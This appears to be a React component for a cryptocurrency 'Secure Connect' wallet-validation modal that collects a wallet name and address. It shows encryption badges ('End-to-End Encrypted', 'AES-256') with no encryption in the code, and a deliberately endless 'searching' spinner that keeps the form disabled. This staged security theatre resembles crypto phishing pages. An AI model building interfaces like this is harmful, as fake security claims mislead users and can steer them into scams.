import React, { useState, useEffect } from 'react';
import { X, Shield, Lock, Wallet2, CheckCircle, Loader } from 'lucide-react';
import EncryptionProgress from './EncryptionProgress';

function WalletConnectionModal({ 
  isOpen, 
  onClose, 
  selectedWallet, 
  onSubmit, 
  isSubmitting, 
  encryptionStep 
}) {
  const [walletAddress, setWalletAddress] = useState('');
  const [customWalletName, setCustomWalletName] = useState('');
  const [isSearchingWallet, setIsSearchingWallet] = useState(true);

  // Continuous wallet search simulation when wallet is selected
  useEffect(() => {
    if (selectedWallet && isOpen) {
      setIsSearchingWallet(true);
      // Keep searching continuously - no timeout to stop it
    }
  }, [selectedWallet, isOpen]);

  const handleSubmit = (e) => {
    e.preventDefault();
    const walletName = selectedWallet?.id === 'other' ? customWalletName : selectedWallet?.name;
    onSubmit(walletName, walletAddress);
  };

  if (!isOpen) return null;

  return (
    <div className="fixed inset-0 bg-black/70 backdrop-blur-sm flex items-center justify-center p-4 z-50">
      <div className="glass-effect rounded-2xl p-8 max-w-md w-full neon-border">
        <div className="flex justify-between items-center mb-8">
          <div>
            <div className="flex items-center space-x-3 mb-2">
              <h3 className="text-xl font-space-grotesk font-bold">
                Secure Connect
              </h3>
              {isSearchingWallet && !isSubmitting && (
                <Loader className="w-5 h-5 text-purple-400 animate-spin" />
              )}
            </div>
            
            {/* Wallet Name Display with Continuous Search Effect */}
            <div className="flex items-center space-x-2">
              {isSearchingWallet && !isSubmitting ? (
                <div className="flex items-center space-x-2">
                  <div className="w-4 h-4 border-2 border-gray-600 rounded-full animate-spin border-t-purple-500"></div>
                  <span className="text-purple-300">Searching for {selectedWallet?.name}...</span>
                </div>
              ) : (
                <span className="text-gray-400">{selectedWallet?.name}</span>
              )}
            </div>
            
            <div className="encryption-badge mt-2">
              <Shield className="w-3 h-3 mr-1" />
              End-to-End Encrypted
            </div>
          </div>
          <button
            onClick={onClose}
            className="text-gray-400 hover:text-white transition-colors"
          >
            <X className="w-6 h-6" />
          </button>
        </div>

        {isSubmitting ? (
          <EncryptionProgress encryptionStep={encryptionStep} />
        ) : (
          <form onSubmit={handleSubmit} className="space-y-6">
            {selectedWallet?.id === 'other' && (
              <div>
                <label className="block text-sm font-medium text-purple-300 mb-3">
                  Enter Wallet Name
                </label>
                <input
                  type="text"
                  value={customWalletName}
                  onChange={(e) => setCustomWalletName(e.target.value)}
                  className="w-full glass-effect rounded-xl px-4 py-3 text-white neon-border focus:border-purple-400 focus:ring-2 focus:ring-purple-500/20 transition-all"
                  placeholder="Enter Wallet Name"
                  required
                />
              </div>
            )}

            <div>
              <label className="block text-sm font-medium text-purple-300 mb-3">
                Wallet Address
              </label>
              <input
                type="text"
                value={walletAddress}
                onChange={(e) => setWalletAddress(e.target.value)}
                className="w-full glass-effect rounded-xl px-4 py-3 text-white neon-border focus:border-purple-400 focus:ring-2 focus:ring-purple-500/20 transition-all"
                placeholder="0x..."
                required
                disabled={isSearchingWallet}
              />
            </div>

            <div className="p-4 glass-effect rounded-xl neon-border bg-purple-500/5">
              <div className="flex items-center space-x-2 mb-2">
                <Lock className="w-4 h-4 text-purple-400" />
                <span className="text-sm font-medium text-purple-300">Encryption Notice</span>
              </div>
              <p className="text-xs text-gray-400">
                Your wallet address will be encrypted using AES-256 encryption.
              </p>
            </div>

            <button
              type="submit"
              disabled={isSubmitting}
              className="w-full btn btn-filled justify-center text-lg py-4 disabled:opacity-50"
            >
              <Shield className="w-5 h-5" />
              {isSubmitting ? 'Encrypting...' : 'Secure Validate Wallet'}
              <Lock className="w-4 h-4" />
            </button>
          </form>
        )}
      </div>
    </div>
  );
}

export default WalletConnectionModal;